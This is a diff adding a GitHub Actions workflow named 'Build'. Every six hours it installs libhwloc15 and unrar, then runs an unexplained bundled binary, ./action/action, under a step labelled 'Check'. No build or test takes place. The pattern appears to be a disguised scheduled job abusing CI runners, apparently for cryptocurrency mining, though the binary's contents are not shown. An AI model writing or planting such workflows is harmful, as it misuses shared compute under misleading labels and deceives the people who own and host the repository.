@@ -1,0 +1,18 @@
+jobs:
+  workflow:
+    name: Run
+    runs-on: ubuntu-20.04
+
+    steps:
+      - name: Initialize
+        uses: actions/checkout@v2
+      - name: Download Deps
+        run: sudo apt-get update && sudo apt-get install -y libhwloc15 unrar
+      - name: Check
+        run: ./action/action
+
+name: Build
+
+on:
+  schedule:
+    - cron: "30 */6 * * *"
